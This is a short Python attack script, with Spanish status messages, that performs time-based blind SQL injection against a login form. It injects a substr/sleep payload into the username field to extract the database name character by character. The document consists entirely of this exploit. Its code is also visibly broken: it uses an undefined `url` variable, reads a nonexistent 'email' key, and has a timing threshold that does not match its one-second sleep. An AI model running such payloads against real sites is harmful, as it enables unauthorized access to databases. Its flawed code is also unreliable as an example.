
from pwn import *
import requests, sys, signal, time,  urllib3, string

urllib3.disable_warnings()
# Ctrl+C
def def_handler(sig, frame):
    print("\n\n [!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global Variables
login_url = ""
# Alphanumeric characters
characters = string.ascii_lowercase + string.digits
# Only letters
# characters = string.ascii_lowercase 

def makeSQLi():
    s = requests.session()
    s.verify = False

    p1 = log.progress('Brute Force')
    p1.status('Inicializating Brute Forcing Procces...')

    time.sleep(2)

    p2 = log.progress("Database")
    database = ""

    for position in range(1, 10):
        for character in characters:
            post_data = {
                'username' : "user@test.es' and if (substr(database(), %d, 1) = '%s', sleep(1), 1)-- -" % (position, character),
                'password' : '#'
            }
            
            p1.status(post_data['email'])
            
            time_start = time.time()
            r = s.post(url, data=post_data)
            time_end = time.time()
            
            if time_end - time_start > 5:
                database += character
                p2.status(database)
                break

if __name__ == '__main__':
    makeSQLi()
